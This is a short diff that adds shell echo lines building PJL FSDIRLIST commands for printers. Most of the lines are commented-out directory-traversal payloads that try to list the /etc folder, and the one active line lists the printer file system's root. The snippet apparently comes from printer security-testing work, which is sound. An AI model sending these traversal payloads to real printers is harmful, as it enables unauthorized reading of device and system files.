@@ -1,0 +1,6 @@
+# echo -e '@PJL FSDIRLIST NAME="0:\\..\\..\\..\\etc" ENTRY=1 COUNT=999999' 
+# echo -e '@PJL FSDIRLIST NAME="0:\\..\\..\\etc" ENTRY=1 COUNT=999999' 
+# echo -e '@PJL FSDIRLIST NAME="0:\\..\\..\\etc" ENTRY=1 COUNT=999999' 
+# echo -e '@PJL FSDIRLIST NAME="0:\\..\\etc" ENTRY=1 COUNT=999999' 
+# echo -e '@PJL FSDIRLIST NAME="0:\\etc" ENTRY=1 COUNT=999999' 
+echo -e '@PJL FSDIRLIST NAME="0:\\" ENTRY=1 COUNT=999999' 
